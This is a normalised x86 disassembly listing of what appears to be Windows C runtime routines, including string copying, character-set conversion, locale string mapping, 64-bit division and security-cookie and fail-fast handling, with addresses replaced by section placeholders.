cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_407f60
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_40814f
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_407ff5
pop ecx
sub_4082ba
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40281d
mov eax [ ebp + 0x8 ]
movzx ecx al
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x90 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_408310
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_40839b
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test [ edi + 0xc ] 0x40
jne r-xdata
add [ edi + 0x4 ] 0xfffffffe
mov eax [ ebp + 0x8 ]
js r-xdata
push edi
call sub_404f52
mov ebx rw-data
pop ecx
cmp eax 0xffffffff
je r-xdata
movzx eax ax
push edi
push eax
call sub_409dff
pop ecx
pop ecx
mov ecx [ edi ]
mov [ ecx ] ax
add [ edi ] 0x2
jmp r-xdata
mov eax ebx
push edi
call sub_404f52
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40174b
mov esp ebp
pop ebp
retn
push edi
call sub_404f52
pop ecx
cmp eax 0xffffffff
je r-xdata
push edi
call sub_404f52
mov esi eax
push edi
sar esi 0x5
call sub_404f52
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ esi * 4 + rw-data ]
pop ecx
jmp r-xdata
mov eax ebx
push edi
call sub_404f52
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x2
je r-xdata
push edi
call sub_404f52
pop ecx
cmp eax 0xffffffff
je r-xdata
push edi
call sub_404f52
mov esi eax
push edi
sar esi 0x5
call sub_404f52
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ esi * 4 + rw-data ]
pop ecx
jmp r-xdata
test [ ebx + 0x4 ] 0x80
je r-xdata
push edi
call sub_404f52
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x1
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_409281
add esp 0x10
test eax eax
je r-xdata
push edi
call sub_404f52
mov esi eax
push edi
sar esi 0x5
call sub_404f52
mov ebx eax
and ebx 0x1f
pop ecx
shl ebx 0x6
add ebx [ esi * 4 + rw-data ]
pop ecx
xor esi esi
cmp [ ebp - 0x10 ] esi
jle r-xdata
mov eax 0xffff
jmp r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
dec [ edi + 0x4 ]
js r-xdata
movsx eax [ ebp + esi - 0xc ]
push edi
push eax
call sub_40255c
pop ecx
pop ecx
mov ecx eax
mov ecx [ edi ]
mov al [ ebp + esi - 0xc ]
mov [ ecx ] al
mov eax [ edi ]
movzx ecx [ eax ]
inc eax
mov [ edi ] eax
jmp r-xdata
inc esi
cmp esi [ ebp - 0x10 ]
jl r-xdata
cmp ecx 0xffffffff
je r-xdata
sub_408521
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
xor eax eax
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_40281d
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_4082ba
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
xor edi edi
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
inc edi
push edi
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov edi [ ebp - 0x10 ]
cmp [ edi + 0x74 ] 0x1
jle r-xdata
xor edi edi
inc edi
jmp r-xdata
movzx eax [ esi ]
mov [ ecx ] ax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_4028d9
or edi 0xffffffff
mov [ eax ] 0x2a
cmp ebx [ edi + 0x74 ]
cmp ebx [ edi + 0x74 ]
jl r-xdata
mov eax edi
pop edi
jmp r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ esi + 0x1 ] 0x0
je r-xdata
jb r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push [ edi + 0x74 ]
push esi
push 0x9
push [ edi + 0x4 ]
call [ MultiByteToWideChar@IAT ]
mov edi [ ebp - 0x10 ]
test eax eax
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ edi + 0x74 ]
jmp r-xdata
sub_408630
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_4086c5
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_4028d9
push 0x16
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
push edi
mov edi esi
sub edi ecx
mov [ esi ] cl
pop edi
test edx edx
jne r-xdata
dec edx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ esi ] dl
call sub_4028d9
push 0x22
jmp r-xdata
mov al [ ecx ]
mov [ edi + ecx ] al
inc ecx
test al al
je r-xdata
pop esi
pop ebp
retn
pop esi
mov [ eax ] esi
call sub_402521
mov eax esi
sub_408720
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
or eax 0x1
retn
test al al
je r-xdata
test al al
je r-xdata
add ecx 0x1
test al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
test ah ah
je r-xdata
test ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
test al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
test ah ah
jne r-xdata
mov edi edi
sub_4087ac
push 0xc
push r--data
call sub_4021d0
push 0xe
call sub_402c45
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_408814
call sub_402215
retn
mov ecx [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_402bcd
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ ecx ] eax
jne r-xdata
mov edx ecx
jmp r-xdata
mov eax [ ecx + 0x4 ]
mov [ edx + 0x4 ] eax
push ecx
call sub_402bcd
pop ecx
mov [ ebp - 0x1c ] ecx
test ecx ecx
je r-xdata
sub_40881d
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
call sub_4028d9
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov edx [ ebp + 0x10 ]
test edx edx
jne r-xdata
mov esi edi
xor eax eax
mov [ edi ] ax
test ecx ecx
je r-xdata
add esi 0x2
dec ecx
jne r-xdata
sub esi edx
cmp [ esi ] 0x0
je r-xdata
xor eax eax
test ecx ecx
jne r-xdata
dec ecx
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ edi ] ax
call sub_4028d9
push 0x22
jmp r-xdata
movzx eax [ edx ]
mov [ esi + edx ] ax
lea edx [ edx + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_402521
mov eax esi
sub_408889
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_4028d9
push 0x16
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
push edi
mov edi esi
sub edi ecx
xor eax eax
mov [ esi ] ax
xor eax eax
pop edi
test edx edx
jne r-xdata
dec edx
jne r-xdata
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_4028d9
push 0x22
jmp r-xdata
movzx eax [ ecx ]
mov [ edi + ecx ] ax
lea ecx [ ecx + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_402521
mov eax esi
sub_4088fe
push ebp
mov ebp esp
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
push esi
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
call sub_4028d9
push 0x16
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
test edx edx
jne r-xdata
xor eax eax
jmp r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
xor eax eax
mov [ ecx ] ax
jmp r-xdata
pop esi
pop ebp
retn
push ebx
mov ebx ecx
push edi
mov edi eax
cmp edx 0xffffffff
jne r-xdata
xor eax eax
mov [ ecx ] ax
sub esi ecx
sub ebx esi
test edx edx
jne r-xdata
dec edi
je r-xdata
test edi edi
pop edi
pop ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ebx ] ax
dec edx
jne r-xdata
cmp edx 0xffffffff
jne r-xdata
movzx eax [ esi ]
mov [ ebx + esi ] ax
lea esi [ esi + 0x2 ]
test ax ax
je r-xdata
jmp r-xdata
movzx eax [ esi + ebx ]
mov [ ebx ] ax
lea ebx [ ebx + 0x2 ]
test ax ax
je r-xdata
xor eax eax
mov [ ecx ] ax
call sub_4028d9
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
push 0x50
mov [ ecx + eax * 2 - 0x2 ] dx
pop eax
jmp r-xdata
pop esi
mov [ eax ] esi
call sub_402521
mov eax esi
sub_4089bc
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ EncodePointer@IAT ]
push esi
push edi
mov [ ebp - 0x1c ] eax
xor esi esi
mov eax [ ebp + 0xc ]
push esi
mov [ ebp - 0x20 ] eax
call ebx
mov edi eax
mov [ ebp - 0x18 ] edi
call sub_402e93
mov [ ebp - 0x14 ] eax
cmp [ rw-data ] esi
jne r-xdata
call [ IsDebuggerPresent@IAT ]
test eax eax
je r-xdata
push 0x800
push esi
push r--data
call [ LoadLibraryExW@IAT ]
mov edi eax
test edi edi
jne r-xdata
cmp [ ebp - 0x14 ] esi
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push r--data
push edi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x57
jne r-xdata
mov eax [ rw-data ]
mov ebx [ DecodePointer@IAT ]
cmp eax edi
je r-xdata
push [ rw-data ]
call [ DecodePointer@IAT ]
push 0x3
jmp r-xdata
cmp [ ebp - 0x14 ] esi
je r-xdata
push eax
call [ OutputDebugStringW@IAT ]
xor eax eax
push eax
call ebx
push r--data
push edi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
push r--data
push edi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
push r--data
push edi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
mov [ rw-data ] eax
test eax eax
je r-xdata
push esi
push esi
push r--data
call [ LoadLibraryExW@IAT ]
mov edi eax
test edi edi
je r-xdata
mov eax [ rw-data ]
cmp eax edi
je r-xdata
cmp [ rw-data ] edi
je r-xdata
pop eax
jmp r-xdata
push 0x4
mov edi [ ebp - 0x18 ]
push r--data
push edi
call [ GetProcAddress@IAT ]
push eax
call ebx
mov [ rw-data ] eax
mov edi [ ebp + 0x10 ]
push eax
call ebx
test eax eax
je r-xdata
push eax
call ebx
push [ rw-data ]
mov [ ebp - 0x14 ] eax
call ebx
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40174b
mov esp ebp
pop ebp
retn
push edi
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push esi
call eax
jmp r-xdata
call eax
mov esi eax
test esi esi
je r-xdata
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax edi
je r-xdata
call ecx
test eax eax
je r-xdata
push eax
call ebx
test eax eax
je r-xdata
mov edi [ ebp + 0x10 ]
or edi 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call [ ebp - 0x18 ]
test eax eax
je r-xdata
push esi
call eax
mov esi eax
push [ rw-data ]
call ebx
test eax eax
je r-xdata
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_408bab
call sub_4035bd
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_4035e6
pop ecx
push 0x3
call sub_401a5f
int3
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push 0x1
push 0x40000015
push 0x3
call sub_4023c4
add esp 0xc
push 0x7
pop ecx
int 0x29
sub_408bee
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_402bcd
pop ecx
sub_408c0c
push ebp
mov ebp esp
push ebx
push esi
push edi
xor edi edi
mov ebx 0xe3
mov eax [ esi * 8 + r--data ]
jns r-xdata
lea edi [ esi + 0x1 ]
lea ebx [ esi - 0x1 ]
jmp r-xdata
lea eax [ ebx + edi ]
cdq
sub eax edx
mov esi eax
sar esi 0x1
push 0x55
push [ esi * 8 + r--data ]
push [ ebp + 0x8 ]
call sub_408cd0
add esp 0xc
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp edi ebx
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_408c5a
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call sub_408c0c
pop ecx
test eax eax
js r-xdata
cmp eax 0xe4
jae r-xdata
mov eax [ eax * 8 + r--data ]
pop ebp
retn
sub_408c84
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_408c5a
pop ecx
push eax
call [ LCMapStringW@IAT ]
pop ebp
retn
xor ecx ecx
push ecx
push ecx
push ecx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_408cd0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
xor eax eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ebx
push edi
mov edi [ ebp + 0x8 ]
push 0x41
pop ebx
push 0x5a
pop edx
sub edi ecx
mov [ ebp + 0x10 ] edx
jmp r-xdata
movzx eax [ edi + ecx ]
cmp ax bx
jb r-xdata
mov edx eax
cmp ax dx
ja r-xdata
add ecx 0x2
dec esi
je r-xdata
cmp ax [ ebp + 0x10 ]
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
movzx ecx ax
movzx eax dx
pop edi
sub eax ecx
pop ebx
test dx dx
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax bx
jb r-xdata
cmp dx ax
je r-xdata
push 0x5a
pop edx
sub_408d3e
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x18 ]
push edi
test esi esi
jle r-xdata
mov ecx [ ebp + 0x24 ]
xor edi edi
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx esi
xor eax eax
cmp [ ebp + 0x28 ] eax
push 0x0
push 0x0
push esi
push [ ebp + 0x14 ]
setne al
lea eax [ eax * 8 + 0x1 ]
push eax
push ecx
call [ MultiByteToWideChar@IAT ]
mov ecx eax
mov [ ebp - 0x8 ] ecx
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov ecx eax
mov [ ebp + 0x24 ] eax
mov eax esi
sub eax ecx
dec eax
cmp eax esi
lea esi [ eax + 0x1 ]
jl r-xdata
inc eax
test ecx ecx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov esi eax
dec ecx
cmp [ eax ] 0x0
je r-xdata
or ecx 0xffffffff
xor ebx ebx
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40174b
mov esp ebp
pop ebp
retn
push ecx
push ebx
push esi
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
add ecx ecx
lea eax [ ecx + 0x8 ]
cmp eax ecx
jbe r-xdata
push ebx
call sub_408bee
pop ecx
mov eax edi
mov esi [ ebp - 0x8 ]
push 0x0
push 0x0
push esi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_408c84
mov edi eax
add esp 0x18
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
lea eax [ eax * 2 + 0x8 ]
cmp eax 0x400
ja r-xdata
test [ ebp + 0x10 ] 0x400
je r-xdata
push eax
call sub_40292d
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
call sub_409f70
mov ebx esp
test ebx ebx
je r-xdata
test edi edi
jle r-xdata
mov ecx [ ebp + 0x20 ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov [ ebx ] 0xdddd
mov [ ebx ] 0xcccc
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp edi ecx
jg r-xdata
test ebx ebx
je r-xdata
add ebx 0x8
mov eax [ ebp - 0x8 ]
push edi
push esi
push eax
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_408c84
add esp 0x18
test eax eax
je r-xdata
lea ecx [ edi + edi ]
lea eax [ ecx + 0x8 ]
cmp eax ecx
jbe r-xdata
push ecx
push [ ebp + 0x1c ]
push esi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_408c84
add esp 0x18
jmp r-xdata
push esi
call sub_408bee
pop ecx
xor eax eax
push eax
push eax
cmp [ ebp + 0x20 ] eax
jne r-xdata
lea eax [ edi * 2 + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push eax
jmp r-xdata
push eax
call sub_40292d
mov esi eax
pop ecx
test esi esi
je r-xdata
call sub_409f70
mov esi esp
test esi esi
je r-xdata
push edi
push esi
push eax
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov edi eax
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_408f42
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40281d
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_408d3e
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_408f88
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x1c ]
push ebx
push esi
push edi
xor edi edi
test ecx ecx
jne r-xdata
push edi
xor eax eax
cmp [ ebp + 0x20 ] eax
push edi
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push ecx
call [ MultiByteToWideChar@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov ecx eax
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
mov esi edi
cmp ebx 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40174b
mov esp ebp
pop ebp
retn
lea eax [ ebx + ebx ]
push eax
push edi
push esi
call sub_406fb0
add esp 0xc
push ebx
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea ecx [ ebx + ebx ]
lea eax [ ecx + 0x8 ]
cmp eax ecx
jbe r-xdata
push esi
call sub_408bee
pop ecx
mov eax edi
push [ ebp + 0x18 ]
push eax
push esi
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov edi eax
lea eax [ ebx * 2 + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_40292d
mov esi eax
pop ecx
test esi esi
je r-xdata
call sub_409f70
mov esi esp
test esi esi
je r-xdata
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_409080
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40281d
push [ ebp + 0x20 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_408f88
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_4090c0
push 0x10
push r--data
call sub_4021d0
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_402c45
pop ecx
and [ ebp - 0x4 ] edi
push 0x3
pop esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_409154
mov eax edi
call sub_402215
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
inc esi
jmp r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
cmp esi 0x14
jl r-xdata
push eax
call sub_401d88
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_402bcd
pop ecx
mov eax [ rw-data ]
and [ eax + esi * 4 ] 0x0
inc edi
mov [ ebp - 0x1c ] edi
sub_40915d
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
push esi
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_40281d
mov eax [ ebp - 0x10 ]
xor esi esi
cmp [ eax + 0xa8 ] esi
jne r-xdata
call sub_4028d9
push 0x16
pop esi
mov [ eax ] esi
call sub_402521
jmp r-xdata
xor eax eax
jmp r-xdata
and [ eax ] 0x0
lea ecx [ ebp + 0xc ]
mov [ ebp + 0xc ] esi
push ecx
push esi
push edi
push ebx
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push esi
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
mov ecx eax
test ecx ecx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
mov eax esi
pop esi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] esi
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
call sub_4028d9
mov [ eax ] 0x2a
call sub_4028d9
mov esi [ eax ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_4028d9
push 0x22
pop esi
mov [ eax ] esi
call sub_402521
jmp r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ eax ] ecx
jmp r-xdata
mov [ eax ] 0x1
jmp r-xdata
mov [ ebx ] al
push edi
push esi
push ebx
call sub_406fb0
add esp 0xc
push edi
push esi
push ebx
call sub_406fb0
add esp 0xc
sub_4092a0
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4092c0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_40174b
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_409305
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_409305
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_4092c0
